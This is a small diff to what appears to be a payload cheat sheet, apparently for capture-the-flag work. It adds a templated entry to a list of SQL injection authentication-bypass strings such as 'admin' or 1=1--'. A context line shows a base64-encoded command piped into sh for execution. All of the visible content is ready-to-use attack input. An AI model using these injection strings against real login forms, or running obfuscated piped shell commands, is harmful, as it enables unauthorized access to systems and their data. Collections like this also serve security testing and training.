@@ -99,6 +99,7 @@ echo "Y2F0IC9mbGFn" | base64 -d | sh
 ### Authentication Bypass
 ```sql
 admin'--
+<username>'--
 admin' #
 admin' or 1=1--
 ' OR 1=1 LIMIT 1--
